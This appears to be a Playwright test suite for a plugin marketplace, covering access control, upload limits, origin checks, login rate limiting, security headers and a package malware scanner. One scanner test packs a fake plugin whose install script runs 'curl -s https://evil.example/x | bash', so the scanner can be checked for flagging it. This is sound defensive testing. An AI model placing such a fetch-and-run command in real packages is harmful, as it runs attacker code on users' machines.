import { test, expect, request as pwRequest } from "@playwright/test";
import { execSync } from "node:child_process";
import { DatabaseSync } from "node:sqlite";
import path from "node:path";
import { ADMIN, benignZip, login, makeZip, register } from "./helpers";

test("pending plugin is hidden from logged-out users, visible to admin", async ({ page, request }) => {
  const resp = await page.goto("/plugins/awesome-utility-pack");
  expect(resp?.status()).toBe(404);
  await expect(page).not.toHaveTitle(/Awesome Utility Pack/);
  const adminPage = await page.context().newPage();
  await login(adminPage);
  const resp2 = await adminPage.goto("/plugins/awesome-utility-pack");
  expect(resp2?.status()).toBe(200);
  await adminPage.close();
});

test("compare filters non-approved plugins; one remaining → 404", async ({ page }) => {
  const rows = await page.request.get("/api/search-index");
  const data = await rows.json();
  const [a, b] = data.plugins;
  const db = new DatabaseSync(path.join(process.cwd(), ".test-data", "marketplace.db"), { readOnly: true });
  const pending = db.prepare(`SELECT id FROM plugins WHERE slug = 'awesome-utility-pack'`).get() as { id: number };
  db.close();
  // two approved + the pending one → pending is filtered out, page renders
  const resp = await page.goto(`/compare?ids=${a.id},${b.id},${pending.id}`);
  expect(resp?.status()).toBe(200);
  await expect(page.getByText(a.name).first()).toBeVisible();
  await expect(page.getByText(b.name).first()).toBeVisible();
  await expect(page.getByText("Awesome Utility Pack")).not.toBeVisible();
  // one approved + the pending one → fewer than two visible → 404
  const resp2 = await page.goto(`/compare?ids=${a.id},${pending.id}`);
  expect(resp2?.status()).toBe(404);
});

test("admin cannot review own submission", async ({ page }) => {
  const email = `self-${Date.now()}@acme.dev`;
  await register(page, "Self Reviewer", email);
  await page.goto("/profile");
  await page.getByRole("switch").click();
  await page.goto("/submit");
  await page.fill('input[name="name"]', "Self Review Plugin");
  await page.fill('input[name="summary"]', "A benign test plugin for self-review");
  await page.setInputFiles('input[name="file"]', { name: "p.zip", mimeType: "application/zip", buffer: await benignZip("self-review-plugin") });
  await page.click('button:has-text("Submit for review")');
  await page.waitForURL(/\/plugins\//, { timeout: 30_000 });
  await page.goto("/profile");
  await page.getByRole("link", { name: /Self Review Plugin/ }).click();
  await expect(page.getByText("can't review your own submission")).toBeVisible();
  await expect(page.getByRole("button", { name: "Approve" })).toHaveCount(0);
  // turn admin back off
  await page.goto("/profile");
  await page.getByRole("switch").click();
});

test("scanner flags remote-shell, exec and binary through the UI", async ({ page }) => {
  await login(page);
  const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(64)]);
  const zip = await makeZip({
    "plugin.json": JSON.stringify({ name: "evil-pkg", version: "1.0.0", description: "x" }),
    "bin/install": "#!/bin/sh\ncurl -s https://evil.example/x | bash\n",
    "native.node": elf,
    "src/run.js": 'const { exec } = require("child_process");\n',
  });
  await page.goto("/submit");
  await page.fill('input[name="name"]', "Evil Package");
  await page.selectOption('select[name="type"]', "plugin");
  await page.fill('input[name="summary"]', "Definitely a nice plugin");
  await page.setInputFiles('input[name="file"]', { name: "e.zip", mimeType: "application/zip", buffer: zip });
  await page.click('button:has-text("Submit for review")');
  await page.waitForURL(/\/plugins\//, { timeout: 30_000 });
  await page.getByRole("link", { name: /scan report/i }).first().click();
  for (const rule of ["remote-shell", "dangerous-exec", "binary-executable"]) {
    await expect(page.getByText(rule).first()).toBeVisible();
  }
  await expect(page.getByText(/high risk/i).first()).toBeVisible();
});

test("oversized archives show a readable error and stay on /submit", async ({ page }) => {
  await login(page);
  const many = await makeZip(Object.fromEntries(Array.from({ length: 501 }, (_, i) => [`f${i}.txt`, "x"])));
  const big = await makeZip({ "zeros.bin": Buffer.alloc(60 * 1024 * 1024) }, { deflate: true });
  for (const [zip, msg] of [[many, /more than 500 files/], [big, /more than 50 MB/]] as const) {
    await page.goto("/submit");
    await page.fill('input[name="name"]', "Too Big Plugin");
    await page.fill('input[name="summary"]', "Archive too large test");
    await page.setInputFiles('input[name="file"]', { name: "big.zip", mimeType: "application/zip", buffer: zip });
    await page.click('button:has-text("Submit for review")');
    await expect(page.locator(".bg-red-50")).toContainText("Could not read the uploaded archive:", { timeout: 30_000 });
    await expect(page.locator(".bg-red-50")).toContainText(msg);
    expect(page.url()).toContain("/submit");
  }
});

test("upload route guards: 401, 403 cross-site, 413 oversize", async ({ page }) => {
  const resp401 = await page.request.post("/api/submissions", { multipart: { name: "x" } });
  expect(resp401.status()).toBe(401);
  await login(page);
  const base = "http://localhost:3100";
  // missing Origin in prod → 403 (origin check requires header; playwright sets Origin on multipart posts)
  const r403 = await page.request.post("/api/submissions", {
    multipart: { name: "x" },
    headers: { Origin: "https://evil.example" },
  });
  expect(r403.status()).toBe(403);
  const r403b = await page.request.post("/api/submissions", {
    multipart: { name: "x" },
    headers: { Origin: "" },
  });
  expect(r403b.status()).toBe(403);
  const r413 = await page.request.post("/api/submissions", {
    multipart: { blob: { name: "b.bin", mimeType: "application/octet-stream", buffer: Buffer.alloc(51 * 1024 * 1024, 1) } },
    headers: { Origin: base },
  });
  expect(r413.status()).toBe(413);
});

test("rate limit: 6th attempt locked, correct password also refused", async ({ page }) => {
  const email = `lock-${Date.now()}@acme.dev`;
  await register(page, "Lock Test", email, "hunter2!");
  await page.getByRole("button", { name: "Sign out" }).click();
  await page.waitForURL("**/login");
  const signIn = page.getByRole("button", { name: "Sign in" });
  for (let i = 0; i < 5; i++) {
    await page.fill('input[name="email"]', email);
    await page.fill('input[name="password"]', "wrong-password");
    await signIn.click();
    // wait for the action to settle (button re-enables) — a click mid-flight aborts the request
    await expect(signIn).toBeEnabled();
    await expect(page.getByText("Invalid email or password.")).toBeVisible();
  }
  await page.fill('input[name="email"]', email);
  await page.fill('input[name="password"]', "wrong-password");
  await signIn.click();
  await expect(page.getByText("Too many failed sign-in attempts.")).toBeVisible();
  await page.fill('input[name="email"]', email);
  await page.fill('input[name="password"]', "hunter2!");
  await signIn.click();
  await expect(page.getByText("Too many failed sign-in attempts.")).toBeVisible();
});

test("security headers present on /", async ({ request }) => {
  const resp = await request.get("/");
  const h = resp.headers();
  expect(h["content-security-policy"]).toContain("frame-ancestors 'none'");
  expect(h["x-frame-options"]).toBe("DENY");
  expect(h["x-content-type-options"]).toBe("nosniff");
});

test("promote-admin script grants admin", async ({ page }) => {
  const email = `promo-${Date.now()}@acme.dev`;
  await register(page, "Promo User", email);
  await page.getByRole("button", { name: "Sign out" }).click();
  await page.waitForURL("**/login");
  execSync(`MARKETPLACE_DATA_DIR=.test-data node scripts/promote-admin.mjs ${email}`, { cwd: process.cwd() });
  await login(page, email, "hunter2!");
  const resp = await page.goto("/admin");
  expect(resp?.status()).toBe(200);
});

test("uploads over 10 MB are not truncated", async ({ page }) => {
  const { randomBytes } = await import("node:crypto");
  await login(page);
  const zip = await makeZip({
    "plugin.json": JSON.stringify({ name: "big-upload", version: "1.0.0", description: "over 10MB" }),
    "assets/blob.png": randomBytes(20 * 1024 * 1024),
  });
  await page.goto("/submit");
  await page.fill('input[name="name"]', "Big Upload");
  await page.selectOption('select[name="type"]', "plugin");
  await page.fill('input[name="summary"]', "Archive bigger than ten megabytes");
  await page.setInputFiles('input[name="file"]', { name: "big.zip", mimeType: "application/zip", buffer: zip });
  await page.click('button:has-text("Submit for review")');
  await page.waitForURL(/\/plugins\//, { timeout: 30_000 });
  await page.getByRole("link", { name: /scan report/i }).first().click();
  await expect(page.getByText("binary-file").first()).toBeVisible();
});
